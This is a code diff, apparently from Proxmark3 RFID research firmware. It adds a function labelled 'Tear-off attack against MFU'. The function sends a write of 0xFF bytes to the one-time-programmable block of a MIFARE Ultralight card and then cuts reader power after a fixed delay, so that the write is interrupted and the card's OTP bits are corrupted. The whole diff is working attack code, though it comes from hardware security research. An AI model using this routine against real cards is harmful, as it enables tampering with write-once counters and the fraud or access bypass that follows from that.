@@ -2173,3 +2173,70 @@ void Mifare_DES_Auth2(uint32_t arg0, uint8_t *datain) {
     LEDsoff();
     set_tracing(false);
 }
+
+//
+// Tear-off attack against MFU.
+// - Moebius et al
+void MifareU_Otp_Tearoff() {
+
+// should the
+// optional time be configurable via client side?
+// optional authentication before?
+// optional data to be written?
+
+    if (DBGLEVEL >= DBG_ERROR) DbpString("Preparing OTP tear-off");
+
+    LEDsoff();
+    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
+    clear_trace();
+    set_tracing(true);
+
+    StartTicks();
+
+#define OTP_TEAR_OFF_TIME 1000
+#define OTP_BLK_NO 3
+
+    // write cmd to send, include CRC
+    // 1b write, 1b block, 4b data, 2 crc
+    uint8_t cmd[] = {MIFARE_ULC_WRITE, OTP_BLK_NO, 0xFF, 0xFF, 0xFF, 0xFF, 0, 0};
+
+// User specific data to write?
+//    memcpy(block + 2, blockData, 4);
+
+    AddCrc14A(cmd, sizeof(cmd) - 2);
+
+    if (DBGLEVEL >= DBG_ERROR) DbpString("Transmitting");
+
+    // anticollision / select card
+    if (!iso14443a_select_card(NULL, NULL, NULL, true, 0, true)) {
+        if (DBGLEVEL >= DBG_ERROR) Dbprintf("Can't select card");
+        OnError(1);
+        return;
+    };
+
+    /*
+    // UL-EV1 / NTAG authentication
+    if (usePwd) {
+        uint8_t pwd[4] = {0x00};
+        memcpy(pwd, datain + 4, 4);
+        uint8_t pack[4] = {0, 0, 0, 0};
+        if (!mifare_ul_ev1_auth(pwd, pack)) {
+            OnError(1);
+            return;
+        }
+    }
+    */
+
+    // send
+    ReaderTransmit(cmd, sizeof(cmd), NULL);
+
+    // Wait before cutting power.  aka tear-off
+    LED_D_ON();
+    WaitUS(OTP_TEAR_OFF_TIME);
+    switch_off();
+
+    reply_ng(CMD_HF_MFU_OTP_TEAROFF, PM3_SUCCESS, NULL, 0);
+    StopTicks();
+
+    if (DBGLEVEL >= DBG_ERROR) DbpString("Done");
+}
